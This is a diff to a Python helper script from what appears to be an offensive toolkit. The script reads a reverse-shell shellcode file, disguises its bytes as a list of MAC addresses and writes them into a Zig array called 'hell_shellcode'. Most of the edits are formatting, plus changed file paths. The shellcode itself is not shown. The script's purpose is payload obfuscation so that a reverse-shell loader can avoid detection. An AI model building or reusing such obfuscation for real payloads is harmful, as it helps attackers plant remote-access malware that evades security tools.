@@ -26,7 +26,7 @@ def mac_obfuscation(mac_bytes):
 
     # Process each 6-byte group as a MAC address
     for i in range(0, len(mac_bytes), 6):
-        mac_group = mac_bytes[i : i + 6]
+        mac_group = mac_bytes[i: i + 6]
 
         # Convert each byte to uppercase hex and join with colons
         mac_string = ":".join(f"{byte:02X}" for byte in mac_group)
@@ -75,7 +75,8 @@ def update_zig_file(filename, mac_addresses):
 
         if std_pos == -1:
             print(
-                f"Error: Could not find 'const std = @import(\"std\");' in {filename}"
+                f"Error: Could not find 'const std = @import(\"std\");' in {
+                    filename}"
             )
             sys.exit(1)
 
@@ -86,7 +87,8 @@ def update_zig_file(filename, mac_addresses):
         start_pos = content.find(start_marker)
         if start_pos == -1:
             print(
-                f"Error: Could not find 'pub const hell_shellcode = [_][]const u8{{' in {filename}"
+                f"Error: Could not find 'pub const hell_shellcode = [_][]const u8{{' in {
+                    filename}"
             )
             sys.exit(1)
 
@@ -96,7 +98,8 @@ def update_zig_file(filename, mac_addresses):
 
         if end_pos == -1:
             print(
-                f"Error: Could not find closing '}}' for hell_shellcode array in {filename}"
+                f"Error: Could not find closing '}}' for hell_shellcode array in {
+                    filename}"
             )
             sys.exit(1)
 
@@ -120,7 +123,8 @@ def update_zig_file(filename, mac_addresses):
             f.write(new_content)
 
         print(
-            f"Successfully updated {filename} with {len(mac_addresses)} MAC addresses"
+            f"Successfully updated {filename} with {
+                len(mac_addresses)} MAC addresses"
         )
 
     except FileNotFoundError:
@@ -134,8 +138,8 @@ def update_zig_file(filename, mac_addresses):
 def main():
     """Main function"""
     # File paths
-    revshell_shellcode = "./payloads/loader.bin"
-    zig_file = "./payloads/payloads.zig"
+    revshell_shellcode = "./revshell.bin"
+    zig_file = "./payloads.zig"
 
     print(f"Reading binary file: {revshell_shellcode}")
 
@@ -165,4 +169,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
